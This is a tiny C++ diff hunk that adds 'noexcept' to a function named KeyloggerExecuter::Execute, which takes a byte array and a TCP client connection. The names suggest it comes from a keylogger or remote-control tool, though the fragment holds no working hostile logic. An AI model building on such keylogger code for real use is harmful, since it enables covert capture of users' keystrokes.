@@ -17,6 +17,7 @@ KeyloggerExecuter::Execute(
     char const *byte_array,
     uint32_t length,
     networking::ITCPClient& connection)
+noexcept
 {
 
     if ( length != sizeof(s_Translation) )
